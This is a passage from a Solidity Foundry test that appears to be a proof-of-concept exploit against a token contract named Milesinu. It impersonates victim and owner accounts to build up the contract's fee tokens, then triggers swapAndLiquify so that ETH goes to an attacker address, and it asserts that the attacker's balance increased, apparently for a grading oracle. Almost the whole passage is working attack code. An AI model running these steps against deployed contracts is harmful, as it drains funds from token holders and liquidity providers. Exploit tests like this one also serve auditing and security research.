        if (contractBalance < 50 * 10**6 * 10**9) {
            // victim1 -> victim2
            uint256 victim1Balance = Milesinu(TARGET).balanceOf(victim1);
            if (victim1Balance > 0) {
                vm.prank(victim1);
                Milesinu(TARGET).transfer(victim2, victim1Balance / 2);
            }

            // victim2 -> victim3
            uint256 victim2Balance = Milesinu(TARGET).balanceOf(victim2);
            if (victim2Balance > 0) {
                vm.prank(victim2);
                Milesinu(TARGET).transfer(victim3, victim2Balance / 2);
            }

            // Update contract balance
            contractBalance = Milesinu(TARGET).balanceOf(TARGET);
            console.log("Contract token balance after multiple transfers:", contractBalance);
        }

        // Step 9: Trigger swapAndLiquify
        // We need contractBalance >= numTokensSellToAddToLiquidity (default: 50 * 10^6 * 10^9)
        // If not enough, do more transfers from owner
        if (contractBalance < 50 * 10**6 * 10**9) {
            // Get more tokens from owner to another address and transfer
            address temp = address(0xABC);

            vm.prank(owner);
            Milesinu(TARGET).transfer(temp, maxTxAmount / 10);

            // Transfer from temp to accumulate fees
            vm.prank(temp);
            Milesinu(TARGET).transfer(address(0xDEF), Milesinu(TARGET).balanceOf(temp));

            contractBalance = Milesinu(TARGET).balanceOf(TARGET);
            console.log("Contract token balance after additional transfers:", contractBalance);
        }

        // Step 10: Now trigger swapAndLiquify with a final transfer
        // This should convert half of contract tokens to ETH and send half of ETH to attacker
        address finalRecipient = address(0xFED);

        // Make a small transfer from any non-pair address to trigger swapAndLiquify
        if (contractBalance >= 50 * 10**6 * 10**9) {
            // Use victim3 to trigger
            uint256 smallAmount = 1 * 10**6 * 10**9; // Small amount

            // Ensure victim3 has tokens
            if (Milesinu(TARGET).balanceOf(victim3) < smallAmount) {
                // Give victim3 some tokens from owner
                vm.prank(owner);
                Milesinu(TARGET).transfer(victim3, smallAmount * 2);
            }

            // This transfer should trigger swapAndLiquify
            vm.prank(victim3);
            Milesinu(TARGET).transfer(finalRecipient, smallAmount);

            console.log("Triggered swapAndLiquify");
        }

        // Step 11: Check if attacker received ETH
        uint256 finalBalance = address(attacker).balance;
        console.log("Initial attacker balance:", initialBalance);
        console.log("Final attacker balance:", finalBalance);

        // The oracle will check if attacker balance increased
        assertGt(finalBalance, initialBalance, "Attacker balance should have increased");
    }




    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

